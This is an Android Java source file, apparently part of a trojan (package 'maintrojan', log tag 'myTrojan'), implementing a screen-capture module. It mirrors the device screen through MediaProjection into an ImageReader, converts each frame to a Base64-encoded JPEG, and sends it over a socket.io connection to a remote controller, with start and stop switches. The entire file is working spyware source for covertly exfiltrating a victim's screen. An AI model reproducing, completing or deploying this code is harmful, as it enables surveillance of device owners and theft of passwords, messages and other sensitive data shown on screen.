package com.example.maintrojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.hardware.display.DisplayManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;

import io.socket.client.IO;
import io.socket.client.Socket;
public class Capture {
    private static final String TAG = "myTrojan";
    private static int width,height,dpi,IMAGES_PRODUCED;
    public static ImageReader mImageReader;
    public static ByteArrayOutputStream outputStream;
    private static boolean START = false;

    @SuppressLint("WrongConstant")
    public static void setup(Socket socket, Context ctx,MediaProjection mProjection,Handler handler,int maxImg){
        // Setup screen data
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        Point size = new Point();
        display.getRealSize(size);
        //=====[]======
        width = size.x;
        height = size.y;
        dpi = metrics.densityDpi;


        // Init Image Reader
        mImageReader = ImageReader.newInstance(width,height, PixelFormat.RGBA_8888,maxImg);
        int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;

        mProjection.createVirtualDisplay("mir-src",width,height,dpi,flags,mImageReader.getSurface(),null,handler);


        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {

            @Override
            public void onImageAvailable(ImageReader imageReader) {
                FileOutputStream fos = null;
                Bitmap bitmap = null;
                outputStream = null;
                try (Image image = mImageReader.acquireLatestImage()) {
                    if(START){
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * width;

                            // create bitmap
                            bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);

                            outputStream = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream);
                            String encode = Base64.encodeToString(outputStream.toByteArray(),Base64.DEFAULT);

                            socket.emit("img",encode);


                            IMAGES_PRODUCED++;
//                            Log.e(TAG, "captured image: " + IMAGES_PRODUCED);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (fos != null) {
                        try {
                            fos.close();
                        } catch (IOException ioe) {
                            ioe.printStackTrace();
                        }
                    }

                    if (bitmap != null) {
                        bitmap.recycle();
                    }

                }
            }
        },handler);
    }



    public static void stop(){
        START = false;
    }
    public static void start(){
        START = true;
    }





}
